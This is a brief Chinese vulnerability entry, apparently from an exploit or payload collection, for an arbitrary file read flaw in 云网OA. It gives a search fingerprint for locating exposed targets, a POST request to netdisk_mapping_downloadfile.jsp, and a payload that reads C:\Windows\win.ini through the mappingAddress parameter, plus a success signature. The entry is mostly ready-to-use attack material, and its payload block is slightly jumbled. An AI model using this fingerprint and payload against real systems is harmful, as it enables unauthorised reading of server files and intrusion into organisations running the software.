# 云网OAnetdisk_mapping_downloadfile存在任意文件读取漏洞

云网 ｜ 任意文件读取/写入 ｜ —
- **指纹**：`body="云网OA"`
- **请求**：`POST /public/netdisk_mapping_downloadfile.jsp HTTP/1.1`

**Payload**
```
fileName=admin&mappingAddress=C:\Windows\win.ini
POST /public/netdisk_mapping_getfile.jsp HTTP/1.1
```
- **响应特征**：200 Support